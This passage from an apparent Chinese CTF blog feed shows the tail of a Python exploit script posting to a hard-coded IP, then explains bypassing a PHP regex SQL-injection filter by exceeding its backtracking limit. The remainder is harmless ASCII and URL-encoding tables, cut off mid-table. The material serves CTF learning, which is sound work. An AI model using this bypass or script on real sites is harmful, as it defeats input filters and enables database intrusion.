class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure><h2 id="非贪婪模式-回溯限制绕过"><a href="#非贪婪模式-回溯限制绕过" class="headerlink" title="非贪婪模式+回溯限制绕过"></a>非贪婪模式+回溯限制绕过</h2><p>例如有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/UNION.+?SELECT/is&#x27;, $input)) &#123;</span><br><span class="line">    die(&#x27;SQL Injection&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>.+?</code>的意思为在对<code>.+</code>的匹配中,使用非贪婪模式来匹配,也就是只要有一个符合条件的字符匹配到, 就结束当前对<code>.+</code>的匹配, 向下执行其他匹配.  如果向下执行的其他匹配失败, 再回溯到此继续执行,匹配一次后再向下, 失败再回溯…</p><p>例如如果输入: <code>UNION/*aaaaa*/SELECT</code></p><p>则匹配的过程为:</p><ul><li><code>.+?</code>匹配到<code>/</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>*</code></li><li><code>S</code>匹配<code>*</code>失败，回溯，再由<code>.+?</code>匹配<code>*</code></li><li>因为非贪婪模式，所以<code>.+?</code>停止匹配，而由<code>S</code>匹配<code>a</code></li><li><code>S</code>匹配<code>a</code>失败，回溯，再由<code>.+?</code>匹配<code>a</code></li><li>…</li></ul><p>那么随着<code>a</code>的数量增加直到超出回溯限制 , 就能够绕过检测</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>速查</title>
      <link href="/post/5e7d3829.html"/>
      <url>/post/5e7d3829.html</url>
      
        <content type="html"><![CDATA[<h1 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h1><table><thead><tr><th>二进制</th><th>十进制</th><th>十六进制</th><th>字符&#x2F;缩写</th><th>解释</th></tr></thead><tbody><tr><td>00000000</td><td>0</td><td>00</td><td>NUL (NULL)</td><td>空字符</td></tr><tr><td>00000001</td><td>1</td><td>01</td><td>SOH (Start Of Headling)</td><td>标题开始</td></tr><tr><td>00000010</td><td>2</td><td>02</td><td>STX (Start Of Text)</td><td>正文开始</td></tr><tr><td>00000011</td><td>3</td><td>03</td><td>ETX (End Of Text)</td><td>正文结束</td></tr><tr><td>00000100</td><td>4</td><td>04</td><td>EOT (End Of Transmission)</td><td>传输结束</td></tr><tr><td>00000101</td><td>5</td><td>05</td><td>ENQ (Enquiry)</td><td>请求</td></tr><tr><td>00000110</td><td>6</td><td>06</td><td>ACK (Acknowledge)</td><td>回应&#x2F;响应&#x2F;收到通知</td></tr><tr><td>00000111</td><td>7</td><td>07</td><td>BEL (Bell)</td><td>响铃</td></tr><tr><td>00001000</td><td>8</td><td>08</td><td>BS (Backspace)</td><td>退格</td></tr><tr><td>00001001</td><td>9</td><td>09</td><td>HT (Horizontal Tab)</td><td>水平制表符</td></tr><tr><td>00001010</td><td>10</td><td>0A</td><td>LF&#x2F;NL(Line Feed&#x2F;New Line)</td><td>换行键</td></tr><tr><td>00001011</td><td>11</td><td>0B</td><td>VT (Vertical Tab)</td><td>垂直制表符</td></tr><tr><td>00001100</td><td>12</td><td>0C</td><td>FF&#x2F;NP (Form Feed&#x2F;New Page)</td><td>换页键</td></tr><tr><td>00001101</td><td>13</td><td>0D</td><td>CR (Carriage Return)</td><td>回车键</td></tr><tr><td>00001110</td><td>14</td><td>0E</td><td>SO (Shift Out)</td><td>不用切换</td></tr><tr><td>00001111</td><td>15</td><td>0F</td><td>SI (Shift In)</td><td>启用切换</td></tr><tr><td>00010000</td><td>16</td><td>10</td><td>DLE (Data Link Escape)</td><td>数据链路转义</td></tr><tr><td>00010001</td><td>17</td><td>11</td><td>DC1&#x2F;XON (Device Control 1&#x2F;Transmission On)</td><td>设备控制1&#x2F;传输开始</td></tr><tr><td>00010010</td><td>18</td><td>12</td><td>DC2 (Device Control 2)</td><td>设备控制2</td></tr><tr><td>00010011</td><td>19</td><td>13</td><td>DC3&#x2F;XOFF (Device Control 3&#x2F;Transmission Off)</td><td>设备控制3&#x2F;传输中断</td></tr><tr><td>00010100</td><td>20</td><td>14</td><td>DC4 (Device Control 4)</td><td>设备控制4</td></tr><tr><td>00010101</td><td>21</td><td>15</td><td>NAK (Negative Acknowledge)</td><td>无响应&#x2F;非正常响应&#x2F;拒绝接收</td></tr><tr><td>00010110</td><td>22</td><td>16</td><td>SYN (Synchronous Idle)</td><td>同步空闲</td></tr><tr><td>00010111</td><td>23</td><td>17</td><td>ETB (End of Transmission Block)</td><td>传输块结束&#x2F;块传输终止</td></tr><tr><td>00011000</td><td>24</td><td>18</td><td>CAN (Cancel)</td><td>取消</td></tr><tr><td>00011001</td><td>25</td><td>19</td><td>EM (End of Medium)</td><td>已到介质末端&#x2F;介质存储已满&#x2F;介质中断</td></tr><tr><td>00011010</td><td>26</td><td>1A</td><td>SUB (Substitute)</td><td>替补&#x2F;替换</td></tr><tr><td>00011011</td><td>27</td><td>1B</td><td>ESC (Escape)</td><td>逃离&#x2F;取消</td></tr><tr><td>00011100</td><td>28</td><td>1C</td><td>FS (File Separator)</td><td>文件分割符</td></tr><tr><td>00011101</td><td>29</td><td>1D</td><td>GS (Group Separator)</td><td>组分隔符&#x2F;分组符</td></tr><tr><td>00011110</td><td>30</td><td>1E</td><td>RS (Record Separator)</td><td>记录分离符</td></tr><tr><td>00011111</td><td>31</td><td>1F</td><td>US (Unit Separator)</td><td>单元分隔符</td></tr><tr><td>00100000</td><td>32</td><td>20</td><td>(Space)</td><td>空格</td></tr><tr><td>00100001</td><td>33</td><td>21</td><td>!</td><td></td></tr><tr><td>00100010</td><td>34</td><td>22</td><td>“</td><td></td></tr><tr><td>00100011</td><td>35</td><td>23</td><td>#</td><td></td></tr><tr><td>00100100</td><td>36</td><td>24</td><td>$</td><td></td></tr><tr><td>00100101</td><td>37</td><td>25</td><td>%</td><td></td></tr><tr><td>00100110</td><td>38</td><td>26</td><td>&amp;</td><td></td></tr><tr><td>00100111</td><td>39</td><td>27</td><td>‘</td><td></td></tr><tr><td>00101000</td><td>40</td><td>28</td><td>(</td><td></td></tr><tr><td>00101001</td><td>41</td><td>29</td><td>)</td><td></td></tr><tr><td>00101010</td><td>42</td><td>2A</td><td>*</td><td></td></tr><tr><td>00101011</td><td>43</td><td>2B</td><td>+</td><td></td></tr><tr><td>00101100</td><td>44</td><td>2C</td><td>,</td><td></td></tr><tr><td>00101101</td><td>45</td><td>2D</td><td>-</td><td></td></tr><tr><td>00101110</td><td>46</td><td>2E</td><td>.</td><td></td></tr><tr><td>00101111</td><td>47</td><td>2F</td><td>&#x2F;</td><td></td></tr><tr><td>00110000</td><td>48</td><td>30</td><td>0</td><td></td></tr><tr><td>00110001</td><td>49</td><td>31</td><td>1</td><td></td></tr><tr><td>00110010</td><td>50</td><td>32</td><td>2</td><td></td></tr><tr><td>00110011</td><td>51</td><td>33</td><td>3</td><td></td></tr><tr><td>00110100</td><td>52</td><td>34</td><td>4</td><td></td></tr><tr><td>00110101</td><td>53</td><td>35</td><td>5</td><td></td></tr><tr><td>00110110</td><td>54</td><td>36</td><td>6</td><td></td></tr><tr><td>00110111</td><td>55</td><td>37</td><td>7</td><td></td></tr><tr><td>00111000</td><td>56</td><td>38</td><td>8</td><td></td></tr><tr><td>00111001</td><td>57</td><td>39</td><td>9</td><td></td></tr><tr><td>00111010</td><td>58</td><td>3A</td><td>:</td><td></td></tr><tr><td>00111011</td><td>59</td><td>3B</td><td>;</td><td></td></tr><tr><td>00111100</td><td>60</td><td>3C</td><td>&lt;</td><td></td></tr><tr><td>00111101</td><td>61</td><td>3D</td><td>&#x3D;</td><td></td></tr><tr><td>00111110</td><td>62</td><td>3E</td><td>&gt;</td><td></td></tr><tr><td>00111111</td><td>63</td><td>3F</td><td>?</td><td></td></tr><tr><td>01000000</td><td>64</td><td>40</td><td>@</td><td></td></tr><tr><td>01000001</td><td>65</td><td>41</td><td>A</td><td></td></tr><tr><td>01000010</td><td>66</td><td>42</td><td>B</td><td></td></tr><tr><td>01000011</td><td>67</td><td>43</td><td>C</td><td></td></tr><tr><td>01000100</td><td>68</td><td>44</td><td>D</td><td></td></tr><tr><td>01000101</td><td>69</td><td>45</td><td>E</td><td></td></tr><tr><td>01000110</td><td>70</td><td>46</td><td>F</td><td></td></tr><tr><td>01000111</td><td>71</td><td>47</td><td>G</td><td></td></tr><tr><td>01001000</td><td>72</td><td>48</td><td>H</td><td></td></tr><tr><td>01001001</td><td>73</td><td>49</td><td>I</td><td></td></tr><tr><td>01001010</td><td>74</td><td>4A</td><td>J</td><td></td></tr><tr><td>01001011</td><td>75</td><td>4B</td><td>K</td><td></td></tr><tr><td>01001100</td><td>76</td><td>4C</td><td>L</td><td></td></tr><tr><td>01001101</td><td>77</td><td>4D</td><td>M</td><td></td></tr><tr><td>01001110</td><td>78</td><td>4E</td><td>N</td><td></td></tr><tr><td>01001111</td><td>79</td><td>4F</td><td>O</td><td></td></tr><tr><td>01010000</td><td>80</td><td>50</td><td>P</td><td></td></tr><tr><td>01010001</td><td>81</td><td>51</td><td>Q</td><td></td></tr><tr><td>01010010</td><td>82</td><td>52</td><td>R</td><td></td></tr><tr><td>01010011</td><td>83</td><td>53</td><td>S</td><td></td></tr><tr><td>01010100</td><td>84</td><td>54</td><td>T</td><td></td></tr><tr><td>01010101</td><td>85</td><td>55</td><td>U</td><td></td></tr><tr><td>01010110</td><td>86</td><td>56</td><td>V</td><td></td></tr><tr><td>01010111</td><td>87</td><td>57</td><td>W</td><td></td></tr><tr><td>01011000</td><td>88</td><td>58</td><td>X</td><td></td></tr><tr><td>01011001</td><td>89</td><td>59</td><td>Y</td><td></td></tr><tr><td>01011010</td><td>90</td><td>5A</td><td>Z</td><td></td></tr><tr><td>01011011</td><td>91</td><td>5B</td><td>[</td><td></td></tr><tr><td>01011100</td><td>92</td><td>5C</td><td>\</td><td></td></tr><tr><td>01011101</td><td>93</td><td>5D</td><td>]</td><td></td></tr><tr><td>01011110</td><td>94</td><td>5E</td><td>^</td><td></td></tr><tr><td>01011111</td><td>95</td><td>5F</td><td>_</td><td></td></tr><tr><td>01100000</td><td>96</td><td>60</td><td>&#96;</td><td></td></tr><tr><td>01100001</td><td>97</td><td>61</td><td>a</td><td></td></tr><tr><td>01100010</td><td>98</td><td>62</td><td>b</td><td></td></tr><tr><td>01100011</td><td>99</td><td>63</td><td>c</td><td></td></tr><tr><td>01100100</td><td>100</td><td>64</td><td>d</td><td></td></tr><tr><td>01100101</td><td>101</td><td>65</td><td>e</td><td></td></tr><tr><td>01100110</td><td>102</td><td>66</td><td>f</td><td></td></tr><tr><td>01100111</td><td>103</td><td>67</td><td>g</td><td></td></tr><tr><td>01101000</td><td>104</td><td>68</td><td>h</td><td></td></tr><tr><td>01101001</td><td>105</td><td>69</td><td>i</td><td></td></tr><tr><td>01101010</td><td>106</td><td>6A</td><td>j</td><td></td></tr><tr><td>01101011</td><td>107</td><td>6B</td><td>k</td><td></td></tr><tr><td>01101100</td><td>108</td><td>6C</td><td>l</td><td></td></tr><tr><td>01101101</td><td>109</td><td>6D</td><td>m</td><td></td></tr><tr><td>01101110</td><td>110</td><td>6E</td><td>n</td><td></td></tr><tr><td>01101111</td><td>111</td><td>6F</td><td>o</td><td></td></tr><tr><td>01110000</td><td>112</td><td>70</td><td>p</td><td></td></tr><tr><td>01110001</td><td>113</td><td>71</td><td>q</td><td></td></tr><tr><td>01110010</td><td>114</td><td>72</td><td>r</td><td></td></tr><tr><td>01110011</td><td>115</td><td>73</td><td>s</td><td></td></tr><tr><td>01110100</td><td>116</td><td>74</td><td>t</td><td></td></tr><tr><td>01110101</td><td>117</td><td>75</td><td>u</td><td></td></tr><tr><td>01110110</td><td>118</td><td>76</td><td>v</td><td></td></tr><tr><td>01110111</td><td>119</td><td>77</td><td>w</td><td></td></tr><tr><td>01111000</td><td>120</td><td>78</td><td>x</td><td></td></tr><tr><td>01111001</td><td>121</td><td>79</td><td>y</td><td></td></tr><tr><td>01111010</td><td>122</td><td>7A</td><td>z</td><td></td></tr><tr><td>01111011</td><td>123</td><td>7B</td><td>{</td><td></td></tr><tr><td>01111100</td><td>124</td><td>7C</td><td>|</td><td></td></tr><tr><td>01111101</td><td>125</td><td>7D</td><td>}</td><td></td></tr><tr><td>01111110</td><td>126</td><td>7E</td><td>~</td><td></td></tr><tr><td>01111111</td><td>127</td><td>7F</td><td>DEL (Delete)</td><td>删除</td></tr></tbody></table><br><hr><br><h1 id="URL编码表"><a href="#URL编码表" class="headerlink" title="URL编码表"></a>URL编码表</h1><h2 id="控制字符-00-1F"><a href="#控制字符-00-1F" class="headerlink" title="控制字符(%00-%1F)"></a>控制字符(%00-%1F)</h2><table><thead><tr><th align="left">ASCII 字符</th><th align="left">描述</th><th align="left">URL-encoding</th></tr></thead><tbody><tr><td align="left">NUL</td><td align="left">null character</td><td align="left">%00</td></tr><tr><td align="left">SOH</td><td align="left">start of header</td><td align="left">%01</td></tr><tr><td align="left">STX</td><td align="left">start of text</td><td align="left">%02</td></tr><tr><td align="left">ETX</td><td align="left">end of text</td><td align="left">%03</td></tr><tr><td align="left">EOT</td><td align="left">end of transmission</td><td align="left">%04</td></tr><tr><td align="left">ENQ</td><td align="left">enquiry</td><td align="left">%05</td></tr><tr><td align="left">ACK</td><td align="left">acknowledge</td><td align="left">%06</td></tr><tr><td align="left">BEL</td><td align="left">bell (ring)</td><td align="left">%07</td></tr><tr><td align="left">BS</td><td align="left">backspace</td><td align="left">%08</td></tr><tr><td align="left">HT</td><td align="left">horizontal tab</td><td align="left">%09</td></tr><tr><td align="left">LF</td><td align="left">line feed</td><td align="left">%0A</td></tr><tr><td align="left">VT</td><td align="left">vertical tab</td><td align="left">%0B</td></tr><tr><td align="left">FF</td><td align="left">form feed</td><td align="left">%0C</td></tr><tr><td align="left">CR</td><td align="left">carriage return</td><td align="left">%0D</td></tr><tr><td align="left">SO</td><td align="left">shift out</td><td align="left">%0E</td></tr><tr><td align="left">SI</td><td align="left">shift in</td><td align="left">%0F</td></tr><tr><td align="left">DLE</td><td align="left">data link escape</td><td align="left">%10</td></tr><tr><td align="left">DC1</td><td align="left">device control 1</td><td align="left">%11</td></tr><tr><td align="left">DC2</td><td align="left">device control 2</td><td align="left">%12</td></tr><tr><td align="left">DC3</td><td align="left">device control 3</td><td align="left">%13</td></tr><tr><td align="left">DC4</td><td align="left">device control 4</td><td align="left">%14</td></tr><tr><td align="left">NAK</td><td align="left">negative acknowledge</td><td align="left">%15</td></tr><tr><td align="left">SYN</td><td align="left">synchronize</td><td align="left">%16</td></tr><tr><td align="left">ETB</td><td align="left">end transmission block</td><td align="left">%17</td></tr><tr><td align="left">CAN</td><td align="left">cancel</td><td align="left">%18</td></tr><tr><td align="left">EM</td><td align="left">end of medium</td><td align="left">%19</td></tr><tr><td align="left">SUB</td><td align="left">substitute</td><td align="left">%1A</td></tr><tr><td align="left">ESC</td><td align="left">escape</td><td align="left">%1B</td></tr><tr><td align="left">FS</td><td align="left">file separator</td><td align="left">%1C</td></tr><tr><td align="left">GS</td><td align="left">group separator</td><td align="left">%1D</td></tr><tr><td align="left">RS</td><td align="left">record separator</td><td align="left">%1E</td></tr><tr><td align="left">US</td><td align="left">unit separator</td><td align="left">%1F</td></tr></tbody></table><h2 id="一般字符"><a href="#一般字符" class="headerlink" title="一般字符"></a>一般字符</h2><table><thead><tr><th align="left">字符</th><th align="left">来自 Windows-1252</th><th align="left">来自 UTF-8</th></tr></thead><tbody><tr><td align="left">space</td><td align="left">%20</td><td align="left">%20</td></tr><tr><td align="left">!</td><td align="left">%21</td><td align="left">%21</td></tr><tr><td align="left">“</td><td align="left">%22</td><td align="left">%22</td></tr><tr><td align="left">#</td><td align="left">%23</td><td align="left">%23</td></tr><tr><td align="left">$</td><td align="left">%24</td><td align="left">%24</td></tr><tr><td align="left">%</td><td align="left">%25</td><td align="left">%25</td></tr><tr><td align="left">&amp;</td><td align="left">%26</td><td align="left">%26</td></tr><tr><td align="left">‘</td><td align="left">%27</td><td align="left">%27</td></tr><tr><td align="left">(</td><td align="left">%28</td><td align="left">%28</td></tr><tr><td align="left">)</td><td align="left">%29</td><td align="left">%29</td></tr><tr><td align="left">*</td><td align="left">%2A</td><td align="left">%2A</td></tr><tr><td align="left">+</td><td align="left">%2B</td><td align="left">%2B</td></tr><tr><td align="left">,</td><td align="left">%2C</td><td align="left">%2C</td></tr><tr><td align="left">-</td><td align="left">%2D</td><td align="left">%2D</td></tr><tr><td align="left">.</td><td align="left">%2E</td><td align="left">%2E</td></tr><tr><td align="left">&#x2F;</td><td align="left">%2F</td><td align="left">%2F</td></tr><tr><td align="left">0</td><td align="left">%30</td><td align="left">%30</td></tr><tr><td align="left">1</td><td align="left">%31</td><td align="left">%31</td></tr><tr><td align="left">2</td><td align="left">%32</td><td align="left">%32</td></tr><tr><td align="left">3</td><td align="left">%33</td><td align="left">%33</td></tr><tr><td align="left">4</td><td align="left">%34</td><td align="left">%34</td></tr><tr><td align="left">5</td><td align="left">%35</td><td align="left">%35</td></tr><tr><td align="left">6</td><td align="left">%36</td><td align="left">%36</td></tr><tr><td align="left">7</td><td align="left">%37</td><td align="left">%37</td></tr><tr><td align="left">8</td><td align="left">%38</td><td align="left">%38</td></tr><tr><td align="left">9</td><td align="left">%39</td><td align="left">%39</td></tr><tr><td align="left">:</td><td align="left">%3A</td><td align="left">%3A</td></tr><tr><td align="left">;</td><td align="left">%3B</td><td align="left">%3B</td></tr><tr><td align="left">&lt;</td><td align="left">%3C</td><td align="left">%3C</td></tr><tr><td align="left">&#x3D;</td><td align="left">%3D</td><td align="left">%3D</td></tr><tr><td align="left">&gt;</td><td align="left">%3E</td><td align="left">%3E</td></tr><tr><td align="left">?</td><td align="left">%3F</td><td align="left">%3F</td></tr><tr><td align="left">@</td><td align="left">%40</td><td align="left">%40</td></tr><tr><td align="left">A</td><td align="left">%41</td><td align="left">%41</td></tr><tr><td align="left">B</td><td align="left">%42</td><td align="left">%42</td></tr><tr><td align="left">C</td><td align="left">%43</td><td align="left">%43</td></tr><tr><td align="left">D</td><td align="left">%44</td><td align="left">%44</td></tr><tr><td align="left">E</td><td align="left">%45</td><td align="left">%45</td></tr><tr><td align="left">F</td><td align="left">%46</td><td align="left">%46</td></tr><tr><td align="left">G</td><td align="left">%47</td><td align="left">%47</td></tr><tr><td align="left">H</td><td align="left">%48</td><td align="left">%48</td></tr><tr><td align="left">I</td><td align="left">%49</td><td align="left">%49</td></tr><tr><td align="left">J</td><td align="left">%4A</td><td align="left">%4A</td></tr><tr><td align="left">K</td><td align="left">%4B</td><td align="left">%4B</td></tr><tr><td align="left">L</td><td align="left">%4C</td><td align="left">%4C</td></tr><tr><td align="left">M</td><td align="left">%4D</td><td align="left">%4D</td></tr><tr><td align="left">N</td><td align="left">%4E</td><td align="left">%4E</td></tr><tr><td align="left">O</td><td align="left">%4F</td><td align="left">%4F</td></tr><tr><td align="left">P</td><td align="left">%50</td><td align="left">%50</td></tr><tr><td align="left">Q</td><td align="left">%51</td><td align="left">%51</td></tr><tr><td align="left">R</td><td align="left">%52</td><td align="left">%52</td></tr><tr><td align="left">S</td><td align="left">%53</td><td align="left">%53</td></tr><tr><td align="left">T</td><td align="left">%54</td><td align="left">%54</td></tr><tr><td align="left">U</td><td align="left">%55</td><td align="left">%55</td></tr><tr><td align="left">V</td><td align="left">%56</td><td align="left">%56</td></tr><tr><td align="left">W</td><td align="left">%57</td><td align="left">%57</td></tr><tr><td align="left">X</td><td align="left">%58</td><td align="left">%58</td></tr><tr><td align="left">Y</td><td align="left">%59</td><td align="left">%59</td></tr><tr><td align="left">Z</td><td align="left">%5A</td><td align="left">%5A</td></tr><tr><td align="left">[</td><td align="left">%5B</td><td align="left">%5B</td></tr><tr><td align="left">\</td><td align="left">%5C</td><td align="left">%5C</td></tr><tr><td align="left">]</td><td align="left">%5D</td><td align="left">%5D</td></tr><tr><td align="left">^</td><td align="left">%5E</td><td align="left">%5E</td></tr><tr><td align="left">_</td><td align="left">%5F</td><td align="left">%5F</td></tr><tr><td align="left">&#96;</td><td align="left">%60</td><td align="left">%60</td></tr><tr><td align="left">a</td><td align="left">%61</td><td align="left">%61</td></tr><tr><td align="left">b</td><td align="left">%62</td><td align="left">%62</td></tr><tr><td align="left">c</td><td align="left">%63</td><td align="left">%63</td></tr><tr><td align="left">d</td><td align="left">%64</td><td align="left">%64</td></tr><tr><td align="left">e</td><td align="left">%65</td><td align="left">%65</td></tr><tr><td align="left">f</td><td align="left">%66</td><td align="left">%66</td></tr><tr><td align="left">g</td><td align="left">%67</td><td align="left">%67</td></tr><tr><td align="left">h</td><td align="left">%68</td><td align="left">%68</td></tr><tr><td align="left">i</td><td align="left">%69</td><td align="left">%69</td></tr><tr><td align="left">j</td><td align="left">%6A</td><td align="left">%6A</td></tr><tr><td align="left">k</td><td align="left">%6B</td><td align="left">%6B</td></tr><tr><td align="left">l</td><td align="left">%6C</td><td align="left">%6C</td></tr><tr><td align="left">m</td><td align="left">%6D</td><td align="left">%6D</td></tr><tr><td align="left">n</td><td align="left">%6E</td><td align="left">%6E</td></tr><tr><td align="left">o</td><td align="left">%6F</td><td align="left">%6F</td></tr><tr><td align="left">p</td><td align="left">%70</td><td align="left">%70</td></tr><tr><td align="left">q</td><td align="left">%71</td><td align="left">%71</td></tr><tr><td align="left">r</td><td align="left">%72</td><td align="left">%72</td></tr><tr><td align="left">s</td><td align="left">%73</td><td align="left">%73</td></tr><tr><td align="left">t</td><td align="left">%74</td><td align="left">%74</td></tr><tr><td align="left">u</td><td align="left">%75</td><td align="left">%75</td></tr><tr><td align="left">v</td><td align="left">%76</td><td align="left">%76</td></tr><tr><td align="left">w</td><td align="left">%77</td><td align="left">%77</td></tr><tr><td align="left">x</td><td align="left">%78</td><td align="left">%78</td></tr><tr><td align="left">y</td><td align="left">%79</td><td align="left">%79</td></tr><tr><td align="left">z</td><td align="left">%7A</td><td align="left">%7A</td></tr><tr><td align="left">{</td><td align="left">%7B</td><td align="left">%7B</td></tr><tr><td align="left">|</td><td align="left">%7C</td><td align="left">%7C</td></tr><tr><td align="left">}</td><td align="left">%7D</td><td align="left">%7D</td></tr><tr><td align="left">~</td><td align="left">%7E</td><td align="left">%7E</td></tr><tr><td align="left"></td><td align="left">%7F</td><td align="left">%7F</td></tr><tr><td align="left">&#96;</td><td align="left">%80</td><td align="left">%E2%82%AC</td></tr><tr><td align="left"></td><td align="left">%81</td><td align="left">%81</td></tr><tr><td align="left">‚</td><td align="left">%82</td><td align="left">%E2%80%9A</td></tr><tr><td align="left">ƒ</td><td align="left">%83</td><td align="left">%C6%92</td></tr><tr><td align="left">„</td><td align="left">%84</td><td align="left">%E2%80%9E</td></tr><tr><td align="left">…</td><td align="left">%85</td><td align="left">%E2%80%A6</td></tr><tr><td align="left">†</td><td align="left">%86</td><td align="left">%E2%80%A0</td></tr><tr><td align="left">‡</td><td align="left">%87</td><td align="left">%E2%80%A1</td></tr><tr><td align="left">ˆ</td><td align="left">%88</td><td align="left">%CB%86</td></tr><tr><td align="left">‰</td><td align="left">%89</td><td align="left">%E2%80%B0</td></tr><tr><td align="left">Š</td><td align="left">%8A</td><td align="left">%C5%A0</td></tr><tr><td align="left">‹</td><td align="left">%8B</td><td align="left">%E2%80%B9</td></tr><tr><td align="left">Œ</td><td align="left">%8C</td><td align="left">%C5%92</td></tr><tr><td align="left"></td><td align="left">%8D</td><td align="left">%C5%8D</td></tr><tr><td align="left">Ž</td><td align="left">%8E</td><td align="left">%C5%BD</td></tr><tr><td align="left"></td><td align="left">%8F</td><td align="left">%8F</td></tr><tr><td align="left"></td><td align="left">%90</td><td align="left">%C2%90</td></tr><tr><td align="left">‘</td><td align="left">%91</td><td align="left">%E2%80%98</td></tr><tr><td align="left">’</td><td align="left">%92</td><td align="left">%E2%80%99</td></tr><tr><td align="left">“</td><td align="left">%93</td><td align="left">%E2%80%9C</td></tr><tr><td align="left">”</td><td align="left">%94</td><td align="left">%E2%80%9D</td></tr><tr><td align="left">•</td><td align="left">%95</td><td align="left">%E2%80%A2</td></tr><tr><td align="left">–</td><td align="left">%96</td><td align="left">%E2%80%93</td></tr><tr><td align="left">—</td><td align="left">%97</td><td align="left">%E2%80%94</td></tr><tr><td align="left">˜</td><td align="left">%98</td><td align="left">%CB%9C</td></tr><tr><td align="left">™</td><td align="left">%99</td><td align="left">%E2%84</td></tr><tr><td align="left">š</td><td align="left">%9A</td><td align="left">%C5%A1</td></tr><tr><td align="left">›</td><td align="left">%9B</td><td align="left">%E2%80</td></tr><tr><td align="left">œ</td><td align="left">%9C</td><td align="left">%C5%93</td></tr><tr><td align="left"></td><td align="left">%9D</td><td align="left">%9D</td></tr><tr><td align="left">ž</td><td align="left">%9E</td><td align="left">%C5%BE</td></tr><tr><td align="left">Ÿ</td><td align="left">%9F</td><td align="left">%C5%B8</td></tr><tr><td align="left"></td><td align="left">%A0</td><td align="left">%C2%A0</td></tr><tr><td align="left">¡</td><td align="left">%A1</td><td align="left">%C2%A1</td></tr><tr><td align="left">¢</td><td align="left">%A2</td><td align="left">%C2%A2</td></tr><tr><td align="left">£</td><td align="left">%A3</td><td align="left">%C2%A3</td></tr><tr><td align="left">¤</td><td align="left">%A4</td><td align="left">%C2%A4</td></tr><tr><td align="left">¥</td><td align="left">%A5</td><td align="left">%C2%A5</td></tr><tr><td align="left">¦</td><td align="left">%A6</td><td align="left">%C2%A6</td></tr><tr><td align="left">§</td><td align="left">%A7</td><td align="left">%C2%A7</td></tr><tr><td align="left">¨</td><td align="left">%A8</td><td align="left">%C2%A8</td></tr><tr><td align="left">©</td><td align="left">%A9</td><td align="left">%C2%A9</td></tr><tr><td align="left">ª</td><td align="left">%AA</td><td align="left">%C2%AA</td></tr><tr><td align="left">«</td><td align="left">%AB</td><td align="left">%C2%AB</td></tr><tr><td align="left">¬</td><td align="left">%AC</td><td align="left">%C2%AC</td></tr><tr><td align="left">­</td><td align="left">%AD</td><td align="left">%C2%AD</td></tr><tr><td align="left">®</td><td align="left">%AE</td><td align="left">%C2%AE</td></tr><tr><td align="left">¯</td><td align="left">%AF</td><td align="left">%C2%AF</td></tr><tr><td align="left">°</td><td align="left">%B0</td><td align="left">%C2%B0</td></tr><tr><td align="left">±</td><td align="left">%B1</td><td align="left">%C2%B1</td></tr><tr><td align="left">²</td><td align="left">%B2</td><td align="left">%C2%B2</td></tr><tr><td align="left">³</td><td align="left">%B3</td><td align="left">%C2%B3</td></tr><tr><td align="left">´</td><td align="left">%B4</td><td align="left">%C2%B4</td></tr><tr><td align="left">µ</td><td align="left">%B5</td><td align="left">%C2%B5</td></tr><tr><td align="left">¶</td><td align="left">%B6</td><td align="left">%C2%B6</td></tr><tr><td align="left">·</td><td align="left">%B7</td><td align="left">%C2%B7</td></tr><tr><td align="left">¸</td><td align="left">%B8</td><td align="left">%C2%B8</td></tr><tr><td align="left">¹</td><td align="left">%B9</td><td align="left">%C2%B9</td></tr><tr><td align="left">º</td><td align="left">%BA</td><td align="left">%C2%BA</td></tr><tr><td align="left">»</td><td align="left">%BB</td><td align="left">%C2%BB</td></tr><tr><td align="left">¼</td><td align="left">%BC</td><td align="left">%C2%BC</td></tr><tr><td align="left">½</td><td align="left">%BD</td><td align="left">%C2%BD</td></tr><tr><td align="left">¾</td><td align="left">%BE</td><td align="left">%C2%BE</td></tr><tr><td align="left">¿</td><td align="left">%BF</td><td align="left">%C2%BF</td></tr><tr><td align="left">À</td><td align="left">%C0</td><td align="left">%C3%80</td></tr><tr><td align="left">Á</td><td align="left">%C1</td><td align="left">%C3%81</td></tr><tr><td align="left">Â</td><td align="left">%C2</td><td align="left">%C3%82</td></tr><tr><td align="left">Ã</td><td align="left">%C3</td><td align="left">%C3%83</td></tr><tr><td align="left">Ä</td><td align="left">%C4</td><td align="left">%C3%84</td></tr><tr><td align="left">Å</td><td align="left">%C5</td><td align="left">%C3%85</td></tr><tr><td align="left">Æ</td><td align="left">%C6</td><td align="left">%C3%86</td></tr><tr><td align="left">Ç</td><td align="left">%C7</td><td align="left">%C3%87</td></tr><tr><td align="left">È</td><td align="left">%C8</td><td align="left">%C3%88</td></tr><tr><td align="left">É</td><td align="left">%C9</td><td align="left">%C3%89</td></tr><tr><td align="left">Ê</td><td align="left">%CA</td><td align="left">%C3%8A</td></tr><tr><td align="left">Ë</td><td align="left">%CB</td><td align="left">%C3%8B</td></tr><tr><td align="left">Ì</td><td align="left">%CC</td><td align="left">%C3%8C</td></tr><tr><td align="left">Í</td><td align="left">%CD</td><td align="left">%C3%8D</td></tr><tr><td align="left">Î</td><td align="left">%CE</td><td align="left">%C3%8E</td></tr><tr><td align="left">Ï</td><td align="left">%CF</td><td align="left">%C3%8F</td></tr><tr><td align="left">Ð</td><td align="left">%D0</td><td align="left">%C3%90</td></tr><tr><td align="left">Ñ</td><td align="left">%D1</td><td align="left">%C3%91</td></tr><tr><td align="left">Ò</td><td align="left">%D2</td><td align="left">%C3%92</td></tr><tr><td align="left">Ó</td><td align="left">%D3</td><td align="left">%C3%93</td></tr><tr><td align="left">Ô</td><td align="left">%D4</td><td align="left">%C3%94</td></tr><tr><td align="left">Õ</td><td align="left">%D5</td><td 